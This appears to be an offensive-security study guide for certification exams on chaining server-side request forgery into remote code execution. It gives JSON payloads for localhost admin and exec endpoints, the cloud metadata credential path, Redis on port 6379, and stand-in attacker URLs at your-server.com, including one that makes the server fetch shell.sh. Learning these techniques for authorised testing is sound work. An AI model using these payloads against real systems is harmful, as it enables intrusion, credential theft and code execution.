## Server-Side — SSRF to RCE

## Objective
Leverage SSRF to achieve Remote Code Execution by:
- Reaching internal services
- Exploiting unsafe integrations
- Abusing trusted internal components

Think: *“What internal service will trust the server enough to execute something for me?”*

---

## 1. Core Idea

SSRF alone = read / reach internal resources  
SSRF → RCE = pivot to something that executes input

```
You → API → SSRF → Internal Service → Code Execution
```

---

## 2. High-Value Targets

### A. Internal admin panels

```json
{"url": "http://127.0.0.1/admin"}
```

→ May expose:
- Debug endpoints
- Command execution features

---

### B. Internal APIs

```json
{"url": "http://127.0.0.1:5000/internal/run"}
```

→ Often:
- No auth
- Trust localhost

---

### C. Cloud metadata → credential theft

```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

→ Use creds to:
- Access S3
- Execute via cloud services

---

## 3. SSRF → Command Execution Patterns

### A. Webhook abuse

If server sends data to URL:

```json
{"callback": "http://your-server.com"}
```

→ You respond with payload → server processes it

---

### B. File write → execution

1. SSRF fetches file from you:

```json
{"url": "http://your-server.com/shell.sh"}
```

2. Saved on server  
3. Trigger execution via another endpoint

---

### C. Internal service exploitation

Example:

```json
{"url": "http://127.0.0.1:8080/exec?cmd=id"}
```

---

### D. Deserialization endpoints

```json
{"url": "http://127.0.0.1/api/import"}
```

→ Send malicious serialized payload

---

## 4. Chaining SSRF

### Step-by-step

1. Confirm SSRF
2. Map internal network:
```json
http://127.0.0.1:PORT
```

3. Identify interesting services:
- admin panels
- debug endpoints
- file upload / import

4. Send payloads via SSRF
5. Trigger execution

---

## 5. Common Exploitation Paths

### SSRF → Admin panel → RCE
- Access hidden admin endpoint
- Trigger command feature

---

### SSRF → Metadata → Cloud RCE
- Extract credentials
- Use cloud CLI / API

---

### SSRF → File upload → Webshell
- Upload via internal service
- Execute shell

---

### SSRF → Redis / internal service abuse

```json
{"url": "http://127.0.0.1:6379"}
```

→ Write data → potential code execution

---

## 6. Indicators of Success

- Command output returned
- New files created
- External callback triggered
- Credentials obtained

---

## 7. Fast Workflow (Exam Mode)

1. Confirm SSRF works
2. Target:
   - 127.0.0.1
   - internal IPs
3. Scan ports via SSRF
4. Identify:
   - admin
   - debug
   - internal APIs
5. Try:
   - command endpoints
   - file fetch/upload
6. Pivot:
   - metadata → creds
   - internal service → execution

---

## 8. Mental Model

SSRF is not the goal.

It is a pivot.

You are:
→ Inside the network without being inside

Goal:
→ Find something that trusts localhost and executes input